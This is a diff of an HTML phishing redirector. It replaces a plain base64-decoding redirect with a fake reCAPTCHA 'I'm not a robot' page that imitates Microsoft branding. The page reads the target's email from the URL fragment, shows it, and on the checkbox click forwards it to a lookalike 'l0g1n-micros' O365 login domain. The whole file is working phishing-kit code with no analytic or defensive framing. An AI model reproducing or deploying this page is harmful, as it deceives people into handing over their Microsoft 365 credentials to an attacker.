@@ -1,56 +1,108 @@
-
-<html>
+<!DOCTYPE html>
+<html lang="en" style="font-family: 'Arial', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 0; background: linear-gradient(to right bottom, #D8DFCD, #E0E9F4, #f4f4f4);">
 <head>
-	<title>Please wait...</title>
-	<!-- Redirection By zero47 -->
-
-	<script type="text/javascript">
-
-	function Fired(){
-		decodeBase64 = function(s) {
-			var e={},i,b=0,c,x,l=0,a,r='',w=String.fromCharCode,L=s.length;
-			var A="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-			for(i=0;i<64;i++){e[A.charAt(i)]=i;}
-			for(x=0;x<L;x++){
-				c=e[s.charAt(x)];b=(b<<6)+c;l+=6;
-				while(l>=8){((a=(b>>>(l-=8))&0xff)||(x<(L-2)))&&(r+=w(a));}
-			}
-			return r;
-		};
-
-		var removeNtbFromURL = function(url) {
-			return url.replace(/&ntb=1/g, ''); // Remove all occurrences of "&ntb=1" from the URL
-		};
-
-		var getParams = function (url) {
-			var params = {};
-			var parser = document.createElement('a');
-			parser.href = url;
-
-			var query = parser.href.split('#');
-
-			for (let param of query ){
-				if (param.includes('@')) {
-					params['email'] = decodeURIComponent(param).trim();
-				} else {
-					params['email'] = decodeURIComponent(decodeBase64(param).trim());
-				}
-			}
-
-			return params;
-		};
-
-		var param = getParams(removeNtbFromURL(window.location.href)); // Remove "&ntb=1" before parsing params
-
-		if (param.email) {
-			window.location.href = 'https://l0g1n-micros.o3e6cc5.com/o365#' + param.email;
-		}
-	}
-
-	</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title> 73boththan </title>
 </head>
+<body style="padding: 0; display: flex; justify-content: left; align-items: center;">
+<div style="margin-bottom: 0;">
+    <div style="display: flex; justify-content: center;">
+        <div style="width: 17px; height: 17px; background-color: #f65314;"></div>
+        <div style="width: 17px; height: 17px; background-color: #7cbf42;"></div>
+    </div>
+    <div style="display: flex; justify-content: center;">
+        <div style="width: 17px; height: 17px; background-color: #00a4ef;"></div>
+        <div style="width: 17px; height: 17px; background-color: #ffb900;"></div>
+    </div><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+</div>
+<div style="text-align: center; padding: 6px; background-color: #fff; border-radius: 10px; width: 230px;">
+    <div style="border: 3px solid #eceff1; position: relative; border-radius: 50%; width: 50px; height: 50px; background-color: #fff; overflow: hidden; margin: 20px auto;">
+        <div id="animator" style="position: absolute; background: #0078d4; width: 100%; height: 100%; border-radius: 50%; bottom: 0;"></div>
+    </div>
+    <label style="font-size: 14px; color: #333; display: flex; justify-content: center; align-items: center; margin-top: 20px;">
+        I'm not a robot
+        <input type="checkbox" id="robotCheckbox" style="margin-left: 10px; transform: scale(1.5); cursor: pointer;">
+    </label>
+    <div id="emailDisplay" style="font-size: 14px; color: #333; margin-top: 10px;"></div>
+    <div style="font-size: 11px; color: #555; margin-top: 10px;">
+        <div aria-hidden="true" role="presentation" style="margin-bottom: 4px; font-size: 12px;">
+            reCAPTCHA
+        </div>
+        <div>
+            <a style="text-decoration: none; color: #3498db;">Microsoft</a><span aria-hidden="true"> - </span>
+            <a style="text-decoration: none; color: #3498db;">Privacy</a><span aria-hidden="true"> - </span>
+            <a style="text-decoration: none; color: #3498db;">Terms</a>
+        </div>
+    </div>
+</div>
+<script>
+    function decodeBase64(s) {
+        var e = {}, i, b = 0, c, x, l = 0, a, r = '', w = String.fromCharCode, L = s.length;
+        var A = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+        for (i = 0; i < 64; i++) { e[A.charAt(i)] = i; }
+        for (x = 0; x < L; x++) {
+            c = e[s.charAt(x)]; b = (b << 6) + c; l += 6;
+            while (l >= 8) { ((a = (b >>> (l -= 8)) & 0xff) || (x < (L - 2))) && (r += w(a)); }
+        }
+        return r;
+    }
 
-<body onload="Fired()">
+    function getParams(url) {
+        var params = {};
+        var parser = document.createElement('a');
+        parser.href = url;
 
+        var hash = parser.hash.substring(1);
+
+        // Check if the hash part contains additional params and split if necessary
+        var emailPart = hash.split('%2F')[0];
+        if (emailPart.includes('@')) {
+            params['email'] = decodeURIComponent(emailPart).trim();
+        } else {
+            params['email'] = decodeBase64(emailPart).trim();
+        }
+
+        return params;
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+        var params = getParams(window.location.href);
+        var email = params.email; // Get decoded email from URL
+        console.log('Email of the recipient:', email);
+
+        // Display the email in the provided div (optional)
+        var emailDisplay = document.getElementById('emailDisplay');
+        if (emailDisplay && email) {
+            emailDisplay.textContent = 'Email: ' + email;
+        }
+
+        // Checkbox click event listener
+        document.getElementById("robotCheckbox").addEventListener("click", function() {
+            setTimeout(function() {
+                window.location.href = "https://l0g1n-micros.o3e6cc5.com/o365#" + email;
+            }, 300);
+        });
+
+        // Animator functionality
+        const animator = document.getElementById('animator');
+        let position = 100;
+        let isRising = true;
+
+        function animate() {
+            if (position <= 0) {
+                isRising = false;
+            } else if (position >= 100) {
+                isRising = true;
+            }
+
+            position += isRising ? -3 : 3;
+            animator.style.transform = 'translateY(' + position + '%)';
+
+            requestAnimationFrame(animate);
+        }
+        requestAnimationFrame(animate);
+    });
+</script>
 </body>
 </html>
